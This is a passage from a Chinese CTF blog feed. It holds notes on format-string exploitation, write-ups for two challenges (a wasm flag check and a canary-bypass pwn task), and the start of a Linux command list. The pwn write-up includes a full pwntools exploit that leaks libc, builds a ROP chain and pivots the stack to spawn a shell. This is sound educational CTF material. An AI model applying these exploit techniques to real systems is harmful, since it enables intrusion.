&lt;addr_high&gt;&lt;addr_low&gt;&lt;填充使总字符数=low&gt;&lt;%p$hn&gt;&lt;填充使总字符数=high_minus_low&gt;&lt;%q$hn&gt;</span><br><span class="line"></span><br><span class="line">其中 p 是 addr_low 的偏移，q 是 addr_high 的偏移。</span><br><span class="line"></span><br><span class="line">第一个 %p$hn 写 low 到 addr_low。</span><br><span class="line"></span><br><span class="line">第二个 %q$hn 写 high 到 addr_high。注意 high_minus_low 可能需要模 65536 计算，如果 high &lt; low 需要加 65536。</span><br><span class="line"></span><br><span class="line">关键点： 精确计算需要打印的字符数（通过添加特定数量的填充字符，如 %1234d）来控制写入的值。写入顺序（先低后高或先高后低）取决于</span><br><span class="line">目标地址的布局和值的大小关系（避免 high &lt; low 时需要额外处理）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%hhn - 写入已打印字符数 (字符 - 1字节) (Write)</span><br><span class="line"></span><br><span class="line">功能： 期望一个 char *（指向字符的指针）作为参数。将到目前为止已成功输出的字符总数（只取其最低 8 位）写入到这个指针指向的内存位置（写入 1 个字节）。</span><br><span class="line"></span><br><span class="line">为什么重要？ 提供最精细的控制粒度。可以分 4 次写入一个 4 字节值或 8 次写入一个 8 字节值。对于写入小值或需要非常精确控制内存内</span><br><span class="line"></span><br><span class="line">容的场景很有用。构造 payload 可能更长（需要更多次写入），但计算相对简单（模 256）。</span><br><span class="line"></span><br><span class="line">漏洞利用 (极其精确的内存覆写)： 原理与 %hn 类似，但分成 4 个字节 (4字节地址) 或 8 个字节 (64位地址)。Payload 包含目标地址的 </span><br><span class="line"></span><br><span class="line">4/8 个部分（每个部分 1 字节）和对应的 %k$hhn 及填充。计算每个阶段需要打印的字符数（模 256）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%p, %x, %d - 泄露数据 (Read)</span><br><span class="line"></span><br><span class="line">%p: 以指针格式（通常是十六进制带 0x 前缀）输出参数（一个地址）。</span><br><span class="line"></span><br><span class="line">%x/%X: 以十六进制格式（无前缀）输出参数（一个无符号整数）。常用于泄露栈上的数据（可能包含指针或 Canary）。</span><br><span class="line"></span><br><span class="line">%d/%u: 以十进制格式输出参数（有符号/无符号整数）。也能泄露栈数据。</span><br><span class="line"></span><br><span class="line">漏洞利用 (信息泄露 - 栈勘查)：</span><br><span class="line"></span><br><span class="line">printf(&quot;%p %p %p %p %p&quot;); - 连续泄露栈上多个位置的值（通常是格式化字符串指针之后的栈内容）。这是最开始的“探针”，用于：</span><br><span class="line"></span><br><span class="line">定位用户输入的格式化字符串本身在栈上的位置（找偏移量 k）。</span><br><span class="line"></span><br><span class="line">寻找栈上的返回地址、库函数地址、Canary 值等。</span><br><span class="line"></span><br><span class="line">printf(&quot;%100$p&quot;); - 直接泄露栈上第 100 个“参数”位置的值（如果存在）。</span><br><span class="line"></span><br><span class="line">结合 %s 泄露任意地址内容（如前所述）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%k$ - 直接参数访问 (关键!)</span><br><span class="line"></span><br><span class="line">功能： 这不是一个独立的说明符，而是修饰符。加在 % 和格式字符（如 s, n, x, p）之间，例如 %8$p, %3$s, %5$n, %10$hn。</span><br><span class="line"></span><br><span class="line">含义： 显式指定使用格式化字符串后面的第 k 个参数（而不是按顺序使用下一个参数）。</span><br><span class="line"></span><br><span class="line">为什么是漏洞利用的核心？</span><br><span class="line"></span><br><span class="line">精准定位： 在格式化字符串漏洞中，攻击者可以精心构造输入字符串（包含目标地址和格式化说明符），并利用 %k$ 精确地告诉 printf 去</span><br><span class="line"></span><br><span class="line">哪里找它需要的指针参数（用于 %s, %n, %hn, %hhn）。这使得攻击者能够读写任意指定的内存地址。</span><br><span class="line"></span><br><span class="line">绕过不确定性： 栈的布局可能因环境而异。通过泄露栈内容（用 %p, %x），攻击者可以计算出目标地址需要放置在格式化字符串的哪个位置，进而确定正确的偏移量 k 用于 %k$。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">假设通过泄露发现，用户输入的格式化字符串起始地址位于栈上第 7 个参数的位置。</span><br><span class="line"></span><br><span class="line">攻击者 payload 开头写入 4 字节的目标地址 0x0804a000。</span><br><span class="line"></span><br><span class="line">那么，这个目标地址就会出现在栈上第 7 个参数的位置（因为格式化字符串指针是第 1 个参数，payload 内容紧随其后）。</span><br><span class="line"></span><br><span class="line">使用 %7$s 就可以尝试读取 0x0804a000 地址处的字符串。</span><br><span class="line"></span><br><span class="line">使用 %7$n 就可以将已打印字符数写入 0x0804a000 地址处。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN</category>
        <category>总结</category>
        <category>stack</category>
        <category>格式化字符串</category>
      </categories>
  </entry>
  <entry>
    <title>湾区杯部分re+pwn</title>
    <url>/2025/09/09/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E9%83%A8%E5%88%86re-pwn/</url>
    <content><![CDATA[<h2 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h2><p>先用解包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wedecode ./wxe4679cbcec91e410</span><br></pre></td></tr></table></figure>

<p>wedecode要自己安装，网上可以自己找教程。</p>
<p><img src="/2025/09/09/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E9%83%A8%E5%88%86re-pwn/1.png" alt="1"></p>
<p>解包成功</p>
<p>找到validator.wasm</p>
<p>用wabt-1.0.37-windows将wasm —-&gt;   wat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wasm2wat wasm文件 -o wat文件</span><br><span class="line">#wasm2wat validator.wasm -o 1.wat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param i32) (result i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (func (;0;) (type 0) (param i32) (result i32)</span><br><span class="line">    (local i32 i32 i32 i32)</span><br><span class="line">    block (result i32)  ;; label = @1</span><br><span class="line">      block  ;; label = @2</span><br><span class="line">        block  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          local.tee 3</span><br><span class="line">          i32.const 3</span><br><span class="line">          i32.and</span><br><span class="line">          i32.eqz</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">          i32.const 0</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.eqz</span><br><span class="line">          br_if 2 (;@1;)</span><br><span class="line">          drop</span><br><span class="line">          loop  ;; label = @4</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.const 1</span><br><span class="line">            i32.add</span><br><span class="line">            local.tee 0</span><br><span class="line">            i32.const 3</span><br><span class="line">            i32.and</span><br><span class="line">            i32.eqz</span><br><span class="line">            br_if 1 (;@3;)</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.load8_u</span><br><span class="line">            br_if 0 (;@4;)</span><br><span class="line">          end</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">        loop  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          local.tee 1</span><br><span class="line">          i32.const 4</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 0</span><br><span class="line">          i32.const 16843008</span><br><span class="line">          local.get 1</span><br><span class="line">          i32.load</span><br><span class="line">          local.tee 4</span><br><span class="line">          i32.sub</span><br><span class="line">          local.get 4</span><br><span class="line">          i32.or</span><br><span class="line">          i32.const -2139062144</span><br><span class="line">          i32.and</span><br><span class="line">          i32.const -2139062144</span><br><span class="line">          i32.eq</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">        end</span><br><span class="line">        loop  ;; label = @3</span><br><span class="line">          local.get 1</span><br><span class="line">          local.tee 0</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.load8_u</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 0</span><br><span class="line">      local.get 3</span><br><span class="line">      i32.sub</span><br><span class="line">    end</span><br><span class="line">    i32.const 38</span><br><span class="line">    i32.ne</span><br><span class="line">    if  ;; label = @1</span><br><span class="line">      i32.const 0</span><br><span class="line">      return</span><br><span class="line">    end</span><br><span class="line">    loop  ;; label = @1</span><br><span class="line">      block  ;; label = @2</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.load8_u offset=1024</span><br><span class="line">        local.get 2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.add</span><br><span class="line">        i32.load8_s</span><br><span class="line">        i32.xor</span><br><span class="line">        local.tee 0</span><br><span class="line">        i32.const 153</span><br><span class="line">        i32.eq</span><br><span class="line">        local.set 1</span><br><span class="line">        local.get 0</span><br><span class="line">        i32.const 153</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if 0 (;@2;)</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee 2</span><br><span class="line">        i32.const 38</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if 1 (;@1;)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">    local.get 1)</span><br><span class="line">  (func (;1;) (type 1))</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (export &quot;a&quot; (memory 0))</span><br><span class="line">  (export &quot;b&quot; (func 1))</span><br><span class="line">  (export &quot;c&quot; (func 0))</span><br><span class="line">  (data (;0;) (i32.const 1024) &quot;\ff\f5\f8\fe\e2\ff\f8\fc\a9\fb\ab\ae\fa\ad\ac\a8\fa\ae\ab\a1\a1\af\ae\f8\ac\af\ae\fc\a1\fa\a8\fb\fb\ad\fc\ac\aa\e4&quot;))</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存数据（十六进制字节）</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0xff</span>, <span class="number">0xf5</span>, <span class="number">0xf8</span>, <span class="number">0xfe</span>, <span class="number">0xe2</span>, <span class="number">0xff</span>, <span class="number">0xf8</span>, <span class="number">0xfc</span>, <span class="number">0xa9</span>, <span class="number">0xfb</span>,</span><br><span class="line">    <span class="number">0xab</span>, <span class="number">0xae</span>, <span class="number">0xfa</span>, <span class="number">0xad</span>, <span class="number">0xac</span>, <span class="number">0xa8</span>, <span class="number">0xfa</span>, <span class="number">0xae</span>, <span class="number">0xab</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xf8</span>, <span class="number">0xac</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xfc</span>, <span class="number">0xa1</span>, <span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0xa8</span>, <span class="number">0xfb</span>, <span class="number">0xfb</span>, <span class="number">0xad</span>, <span class="number">0xfc</span>, <span class="number">0xac</span>, <span class="number">0xaa</span>, <span class="number">0xe4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个字节与0x99异或，并转换为ASCII字符串</span></span><br><span class="line">result = <span class="built_in">bytes</span>(b ^ <span class="number">0x99</span> <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">flag = result.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;fae0b27c451c728867a567e8c1bb4e53&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ood-canary"><a href="#ood-canary" class="headerlink" title="ood_canary"></a>ood_canary</h2><p>before_main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">before_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(name, <span class="string">&quot;ctfer&quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(bss, <span class="string">&quot;Don&#x27;t always trust the canary.&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  __writefsqword(<span class="number">0x28u</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy the game !\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Choose (good/vuln/exit): &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">7uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;good&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      good_news();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;vuln&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      vuln();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;exit&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      exit_a(<span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>good_news</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">good_news</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I will tell you good news,%s \n&quot;</span>, name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;but you must tell me your name first:&quot;</span>);</span><br><span class="line">  *((_BYTE *)buf + (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x28u</span>LL)) = <span class="number">10</span>;</span><br><span class="line">  *(_QWORD *)bss = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(name, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Great, the good news is that I know your real name,%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exit_a</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">exit_a</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure ? [y/n]&quot;</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">121</span> )</span><br><span class="line">    _exit(a1);</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)bss = &amp;v2;</span><br><span class="line">    --flag;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you lost flag &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vuln</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 buf[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v1 = v3;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your payload: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;exec&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Processed: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  __writefsqword(<span class="number">0x28u</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>

<p>开启了canary,但是不影响</p>
<p>先看good_news puts的被放在了bss段bss:0000000000404080 bss，name在bss:0000000000404060 name，然后有个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;Great, the good news is that I know your real name,%s\n&quot;, (const char *)buf);</span><br></pre></td></tr></table></figure>

<p>我们可以利用取个0x20的name，如果数据中没有空字节，<code>name</code> 不会以空字节终止，我们就可以利用其接着泄露出puts的地址。</p>
<p>接着看vuln，  read(0, buf, 0x40uLL);存在栈溢出，但是能利用的只有0x10正好是栈迁移的标志。</p>
<p>但是我们还缺少一个栈的地址，可以在exit_a将栈地址放入bss段再到good函数泄露出栈的地址，然后再用栈迁移getshell。</p>
<p>exp</p>
<p>是战队里一个师傅写出来的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">call_read = <span class="number">0x401440</span></span><br><span class="line">leave_ret = <span class="number">0x4014B6</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./odd_canary&quot;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">io = process(pwnfile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good_news</span>(<span class="params">io, payload, is_leak=<span class="literal">False</span></span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;good&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_leak:</span><br><span class="line">        io.recv(<span class="built_in">len</span>(<span class="string">&quot;I will tell you good news,&quot;</span>)+<span class="number">0x20</span>)</span><br><span class="line">        leak = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    io.sendafter(<span class="string">b&quot;but you must tell me your name first:&quot;</span>,  payload)</span><br><span class="line">    <span class="keyword">return</span> leak <span class="keyword">if</span> is_leak <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">good_news(io, flat(cyclic(<span class="number">0x20</span>)))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc.address = good_news(io, flat(cyclic(<span class="number">0x20</span>)), <span class="literal">True</span>) - <span class="number">0x8db60</span> </span><br><span class="line">success(<span class="string">f&quot;libc.address: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Are you sure ? [y/n]\n&quot;</span>, <span class="string">b&#x27;n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = good_news(io, flat(cyclic(<span class="number">0x20</span>)), <span class="literal">True</span>)</span><br><span class="line">success(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">str_bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">success(<span class="string">f&quot;str_bin_sh: <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr = libc.sym.system</span><br><span class="line">success(<span class="string">f&quot;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">ret = leave_ret + <span class="number">1</span></span><br><span class="line">pop_rdi = libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>), executable=<span class="literal">True</span>).__next__()</span><br><span class="line">success(<span class="string">f&quot;pop_rdi: <span class="subst">&#123;<span class="built_in">hex</span>(pop_rdi)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Choose (good/vuln/exit): &quot;</span>, <span class="string">b&#x27;vuln&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your payload: \n&quot;</span>, <span class="string">b&#x27;exec&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) + p64(<span class="number">0x0</span>) + p64(stack_addr-<span class="number">0x27</span>) + p64(leave_ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>但是我在本地复现，查看bss段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x00404020</span><br><span class="line">0x404020 &lt;stdout@@GLIBC_2.2.5&gt;:	0x000079ba9ae045c0	0x0000000000000000</span><br><span class="line">0x404030 &lt;stdin@@GLIBC_2.2.5&gt;:	0x000079ba9ae038e0	0x0000000000000000</span><br><span class="line">0x404040 &lt;heap_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x404050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x404060 &lt;name&gt;:	0x6161616261616161	0x6161616461616163</span><br><span class="line">0x404070:	0x000000000000000a	0x0000000000000000</span><br><span class="line">0x404080 &lt;bss&gt;:	0x000079ba9ac87be0	0x7572742073796177</span><br><span class="line">0x404090 &lt;bss+16&gt;:	0x6320656874207473	0x00002e7972616e61</span><br><span class="line">0x4040a0 &lt;bss+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x4040b0 &lt;bss+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>puts的地址0x000079ba9ac87be0和给的libc不一样，暂时还不知道哪里的问题。</p>
<p>OK我发现问题在哪里了，原来它加载的是我本地libc.so.6不是题目给的。直接换用自己的libc.so.6就可以打通了。</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
  </entry>
  <entry>
    <title>渗透学习</title>
    <url>/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="渗透之路"><a href="#渗透之路" class="headerlink" title="渗透之路"></a>渗透之路</h1><p>身为一个网安生我感觉渗透应该是必学的，所以从现在开始我开始我的渗透之路了。</p>
<h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                                                           //列出当前目录中的文件和子目录</span><br><span class="line">pwd                                                          //显示当前工作目录的路径</span><br><span class="line">cd /path/to/directory                                        //切换工作目录</span><br><span class="line">mkdir directory_name                                         //创建新目录</span><br><span class="line">rmdir directory_name                                         //删除空目录</span><br><span class="line">rm file_name                                                 //删除文件或目录</span><br><span class="line">rm -r directory_name                                         //递归删除目录及其内容</span><br><span class="line">cp source_file destination                                   //复制文件或目录</span><br><span class="line">cp -r source_directory destination                           //递归复制目录及其内容</span><br><span class="line">mv old_name new_name                                         //移动或重命名文件或目录</span><br><span class="line">touch file_name                                              //创建空文件或更新文件的时间戳</span><br><span class="line">cat file_name                                                //连接和显示文件内容</span><br><span class="line">more/less                                                    //逐页显示文本文件内容</span><br><span class="line">head/tail(head -n 10 file_name  # 显示文件的前10行)           //显示文件的前几行或后几行</span><br><span class="line">grep search_term file_name                                   //在文件中搜索指定文本</span><br><span class="line">ps aux                                                       //显示当前运行的进程</span><br><span class="line">kill process_id                                              //终止进程</span><br><span class="line">ifconfig/ip(ip addr show)                                    //查看和配置网络接口信息</span><br><span class="line">ping host_name_or_ip                                         //测试与主机的连通性</span><br><span class="line">wget/curl(wget URL/curl -O URL)                              //从网络下载文件</span><br><span class="line">chown owner:group file_name                                  //修改文件或目录的所有者</span><br><span class="line">tar -czvf archive.tar.gz directory_name                      //压缩目录</span><br><span class="line">tar -xzvf archive.tar.gz                                     //解压文件</span><br><span class="line">df -h                                                        //显示磁盘空间使用情</span><br><span class="line">du -h directory_name                                         //显示目录的磁盘使用情况</span><br><span class="line">mount /dev/sdX1 /mnt                                         //挂载分区到指定目录</span><br><span class="line">umount /mnt                                                  //卸载挂载的文件系统</span><br><span class="line">psql -U username -d database_name                            //连接到PostgreSQL数据库</span><br><span class="line">mysql -u username -p                                         //连接到MySQL数据库</span><br><span class="line">top/htop                                                     //显示系统资源的实时使用情况和进程信息</span><br><span class="line">ssh username@remote_host                                     //远程登录到其他计算机</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //安全地将文件从本地复制到远程主机，或从远程主机复制到本地</span><br><span class="line">find /path/to/search -name &quot;file_pattern&quot;                    //在文件系统中查找文件和目录</span><br><span class="line">grep -r &quot;pattern&quot; /path/to/search                            //在文本中搜索匹配的行，并可以使用正则表达式进行高级搜索</span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; file_name                         //流编辑器，用于文本处理和替换</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; file_name                                   //提取文件中的第一列数据</span><br><span 